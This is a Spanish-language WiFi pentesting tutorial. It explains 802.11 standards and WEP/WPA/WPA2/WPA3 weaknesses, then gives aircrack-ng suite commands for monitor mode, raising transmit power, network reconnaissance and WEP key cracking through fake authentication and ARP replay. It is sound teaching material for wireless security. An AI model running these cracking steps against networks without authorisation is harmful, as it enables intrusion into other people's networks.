# Fundamentos de Redes Wireless

## Estándares WiFi (802.11)

```
802.11b (1999)
• Frecuencia: 2.4 GHz
• Velocidad: 11 Mbps

802.11a (1999)
• Frecuencia: 5 GHz
• Velocidad: 54 Mbps

802.11g (2003)
• Frecuencia: 2.4 GHz
• Velocidad: 54 Mbps

802.11n (2009) - WiFi 4
• Frecuencia: 2.4/5 GHz
• Velocidad: 600 Mbps

802.11ac (2013) - WiFi 5
• Frecuencia: 5 GHz
• Velocidad: 1.3 Gbps

802.11ax (2019) - WiFi 6
• Frecuencia: 2.4/5/6 GHz
• Velocidad: 9.6 Gbps
```

---

## Protocolos de Seguridad

### **WEP (Wired Equivalent Privacy)**

```
Año: 1997
Estado: OBSOLETO, MUY VULNERABLE

Características:
• Cifrado RC4 (40 o 104 bits)
• IV de 24 bits (se repite rápidamente)
• Sin autenticación mutua

Vulnerabilidades:
• IV collision
• Criptoanálisis estadístico
• Se puede crackear en minutos

Ataque: Recolectar IVs → Aircrack-ng
```

---

### **WPA (WiFi Protected Access)**

```
Año: 2003
Estado: VULNERABLE

Características:
• TKIP (Temporal Key Integrity Protocol)
• Cifrado RC4 mejorado
• MIC (Message Integrity Check)

Vulnerabilidades:
• Ataque de diccionario en handshake
• TKIP vulnerabilities

Ataque: Capturar handshake → Crackear con wordlist
```

---

### **WPA2 (WiFi Protected Access 2)**

```
Año: 2004
Estado: SEGURO con contraseña fuerte

Características:
• CCMP (Counter Mode CBC-MAC Protocol)
• Cifrado AES
• IEEE 802.11i

Modos:
• WPA2-PSK (Personal) - Pre-Shared Key
• WPA2-Enterprise (RADIUS server)

Vulnerabilidades:
• Contraseñas débiles (ataque de diccionario)
• KRACK (Key Reinstallation Attack)
• WPS habilitado

Ataque: Capturar handshake → Crackear offline
```

---

### **WPA3 (WiFi Protected Access 3)**

```
Año: 2018
Estado: MÁS SEGURO

Características:
• SAE (Simultaneous Authentication of Equals)
• Forward Secrecy
• 192-bit encryption (Enterprise)
• Protección contra offline dictionary attacks

Mejoras:
• Protección contra KRACK
• Individualized Data Encryption
• Easy Connect (DPP)

Vulnerabilidades conocidas:
• Dragonblood (parcheado)
• Side-channel attacks (complejidad alta)
```

---

## Componentes de Red WiFi

### **SSID (Service Set Identifier)**

```
Nombre de la red WiFi

Tipos:
• Broadcast SSID (visible)
• Hidden SSID (oculto, pero detectable)

Longitud: 0-32 caracteres
```

### **BSSID (Basic Service Set Identifier)**

```
Dirección MAC del Access Point

Formato: XX:XX:XX:XX:XX:XX

Útil para identificar AP específico en redes con mismo SSID
```

### **Canales WiFi**

```
2.4 GHz:
• 14 canales (1-14)
• Canales sin solapamiento: 1, 6, 11

5 GHz:
• Más canales disponibles
• Menos interferencia
• Mayor ancho de banda
```

---

## Handshake de 4 Vías (WPA/WPA2)

```
Cliente                        Access Point

1. Cliente solicita autenticación
                  →
2. AP envía ANonce (nonce del AP)
                  ←
3. Cliente genera SNonce, calcula PTK
   Envía SNonce + MIC
                  →
4. AP verifica MIC, calcula PTK
   Envía ACK + GTK
                  ←

PTK = Pairwise Transient Key
GTK = Group Temporal Key
MIC = Message Integrity Check

Este handshake es lo que capturamos para crackear
```

---

# Configuración de Adaptadores

## Adaptadores Compatibles

### **Recomendados para Pentesting:**

```
• Alfa AWUS036ACH (WiFi 5, dual-band)
• Alfa AWUS036NHA (WiFi 4, 2.4 GHz)
• TP-Link TL-WN722N v1 (barato, efectivo)
• Panda PAU09 N600
• Alfa AWUS1900 (WiFi 5, potente)

Chipsets compatibles:
• Atheros AR9271
• Ralink RT3070
• Realtek RTL8812AU
```

---

## Modo Monitor

### **¿Qué es Modo Monitor?**

```
Permite capturar todos los paquetes WiFi en el aire
No solo los destinados a tu adaptador

Modo Normal (Managed):
• Solo paquetes para tu MAC

Modo Monitor:
• Todos los paquetes del canal
• Beacons, probes, data, handshakes
```

---

### **Activar Modo Monitor**

```bash
# Verificar adaptador
iwconfig
ip link show

# Método 1: airmon-ng
sudo airmon-ng check kill  # Matar procesos que interfieren
sudo airmon-ng start wlan0
# Crea interfaz: wlan0mon

# Verificar
iwconfig

# Método 2: Manual
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Cambiar canal
sudo iw dev wlan0mon set channel 6

# Desactivar modo monitor
sudo airmon-ng stop wlan0mon

# O manual
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

---

## Aumentar Potencia TX

```bash
# Ver potencia actual
iwconfig wlan0mon

# Aumentar potencia (cuidado, puede ser ilegal en algunos países)
sudo iw dev wlan0mon set txpower fixed 3000  # 30 dBm

# Verificar
iwconfig wlan0mon | grep "Tx-Power"
```

---

# Reconocimiento WiFi

## Airodump-ng - Escaneo de Redes

### **Escaneo Básico**

```bash
# Escanear todas las redes
sudo airodump-ng wlan0mon

# Columnas importantes:
# BSSID     - MAC del AP
# PWR       - Señal (-30 cerca, -90 lejos)
# Beacons   - Tramas beacon
# CH        - Canal
# ENC       - Cifrado (WEP, WPA, WPA2)
# CIPHER    - Algoritmo (TKIP, CCMP)
# AUTH      - Autenticación (PSK, MGT)
# ESSID     - Nombre de red

# Escanear canal específico
sudo airodump-ng -c 6 wlan0mon

# Escanear banda 5 GHz
sudo airodump-ng --band a wlan0mon

# Escanear ambas bandas
sudo airodump-ng --band abg wlan0mon
```

---

### **Captura Enfocada**

```bash
# Capturar tráfico de AP específico
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Parámetros:
# -c        Canal
# --bssid   MAC del AP
# -w        Archivo de salida (capture-01.cap)

# Archivos generados:
# capture-01.cap     - Handshakes y datos
# capture-01.csv     - Info en CSV
# capture-01.kismet.csv
# capture-01.log.csv
```

---

## Otras Herramientas de Reconocimiento

### **Wash - Detectar WPS**

```bash
# Escanear APs con WPS habilitado
sudo wash -i wlan0mon

# Columnas:
# BSSID
# Channel
# RSSI (señal)
# WPS Version
# WPS Locked (Si/No)
# ESSID
```

---

### **Kismet**

```bash
# Instalar
sudo apt install kismet

# Iniciar
sudo kismet

# Web interface: http://localhost:2501

# Características:
# • Escaneo multi-canal
# • Detección de dispositivos ocultos
# • Logging avanzado
# • Detección de intrusiones
```

---

### **Wifite**

```bash
# Herramienta automatizada

# Instalar
sudo apt install wifite

# Ejecutar
sudo wifite

# Características:
# • Automatiza todo el proceso
# • Soporta WEP, WPA, WPS
# • Ataques múltiples en secuencia
# • Fácil de usar
```

---

# Ataques WEP

## Crackeo de WEP

### **Método 1: Ataque Pasivo**

```bash
# 1. Capturar tráfico
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_capture wlan0mon

# Esperar a recolectar ~50,000 IVs (puede tomar horas)

# 2. Crackear con aircrack-ng
sudo aircrack-ng wep_capture-01.cap

# Aircrack-ng encuentra la clave WEP
```

---

### **Método 2: Ataque Activo (Más Rápido)**

```bash
# 1. Capturar tráfico en terminal 1
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_crack wlan0mon

# 2. Autenticación falsa (terminal 2)
sudo aireplay-ng -1 0 -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -1    Fake authentication
# -a    BSSID del AP
# -h    Tu MAC

# 3. ARP Replay Attack (terminal 3)
sudo aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon
# -3    ARP replay
# Captura ARP request y lo reinyecta miles de veces

# 4. Crackear cuando tengas ~40,000 IVs (terminal 4)
sudo aircrack-ng wep_crack-01.cap

# WEP crackeado en 5-10 minutos
```